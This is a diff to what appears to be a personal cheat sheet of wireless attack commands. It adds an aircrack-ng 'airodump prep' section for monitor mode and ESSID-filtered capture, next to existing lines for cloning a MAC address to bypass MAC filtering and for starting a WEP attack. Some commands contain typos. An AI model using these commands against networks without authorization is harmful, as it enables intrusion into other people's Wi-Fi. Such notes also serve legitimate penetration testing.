@@ -26,6 +26,16 @@ MAC Filtering Bypass
 # sudo ifconfig wlan hw ether [CLONED MAC]
 # sudo ifconfig wlan0 up
 
+
+--airodump prep--
+#airmon-ng
+#airmon-ng start wlan1
+[you may have to run airmon-ng check kill]
+#airmon-ng start wlan1
+#ifconfig  ' to show the wlan#mon port
+# airomdump-ng wlan1mon
+# airodump-ng wlan1mon --essid [ESSID NAME]
+
 WEP attack
 # sudo airmon-ng start wlan0 [CHANNEL]
 # sudo airodump-ng --chanel [CHANEL] --bssid [MAC ADDR] --write - [FILE NAME] mon0
